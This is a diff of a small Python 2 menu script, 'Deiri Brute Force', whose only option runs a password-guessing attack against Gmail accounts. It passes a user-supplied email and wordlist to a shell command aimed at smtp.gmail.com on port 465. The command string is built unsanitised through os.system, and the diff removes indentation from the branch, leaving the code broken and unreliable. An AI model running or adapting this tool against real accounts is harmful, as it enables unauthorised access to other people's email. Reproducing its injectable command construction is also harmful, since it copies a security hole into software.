@@ -24,23 +24,22 @@ print
 print "              ===|[ Deiri Brute Force ]|==="
 print
 print " [01] Gmail Brute Force         "
-
 print
 print " [00] Exit"
 print
 bdeiri = raw_input("[*] B-Deiri > ")
   
 elif bdeiri == '01' or bdeiri == '1':
-  print
-  print "          +------------------------------+"
-  print "          |  Gmail Brute Force |"
-  print "          +------------------------------+"
-  print
-  print
-  email = raw_input("[*] Email : ")
-  word = raw_input("[*] Wordlist : ")
-  os.system("deiri -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
-  sys.exit()
+print
+print "          +------------------------------+"
+print "          |  Gmail Brute Force |"
+print "          +------------------------------+"
+print
+print
+email = raw_input("[*] Gmail : ")
+word = raw_input("[*] Wordlist : ")
+os.system("deiri -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
+sys.exit()
   
 elif bdeiri == '00' or bdeiri == '0':
 	print "\n[!] Exit the Program..."
